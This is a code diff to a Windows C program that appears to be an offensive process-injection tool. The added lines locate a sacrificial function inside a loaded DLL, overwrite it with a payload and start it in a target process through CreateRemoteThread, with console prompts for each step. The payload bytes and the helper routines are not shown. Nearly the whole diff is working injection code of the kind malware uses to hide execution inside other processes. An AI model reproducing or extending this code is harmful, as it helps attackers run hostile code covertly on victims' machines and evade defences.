@@ -135,7 +135,7 @@ int wmain(int argc, wchar_t* argv[]){
 	PVOID pAddress = NULL;
 	DWORD dwProcessId = NULL;
 
-	HANDLE hModule = NULL;
+	HMODULE hModule = NULL;
 
 	if (argc < 2) {
 		wprintf(L"[!] Enter a valid process \n");
@@ -154,5 +154,43 @@ int wmain(int argc, wchar_t* argv[]){
 		printf("Dll not loaded successfully ! error : %d\n",GetLastError());
 		return EXIT_FAILURE;
 	}
+	printf("[+] Done !!\n");
+
+	pAddress = GetProcAddress(hModule, SACRIFICIAL_FUNC);
+
+	if (pAddress == NULL) {
+		printf("Function didn't load successfully ! error : %d\n", GetLastError());
+		return EXIT_FAILURE;
+	}
+
+	printf(" Our function %s address is : %p",SACRIFICIAL_FUNC, pAddress);
+
+
+
+
+
+	printf("[#] Press <Enter> To Write Payload ... ");
+	getchar();
+	printf("[i] Writing ... ");
+	if (!WritePayload(hModule,pAddress, Payload, sizeof(Payload))) {
+		return -1;
+	}
+	printf("[+] DONE \n");
+
+
+
+	printf("[#] Press <Enter> To Run The Payload ... ");
+	getchar();
+
+	hThread = CreateRemoteThread(hProcess,NULL, NULL, (LPTHREAD_START_ROUTINE)pAddress, NULL, NULL, NULL);
+	if (hThread != NULL)
+		WaitForSingleObject(hThread, INFINITE);
+
+	printf("[#] Press <Enter> To Quit ... ");
+	getchar();
+
+	return 0;
+
+
 
 }
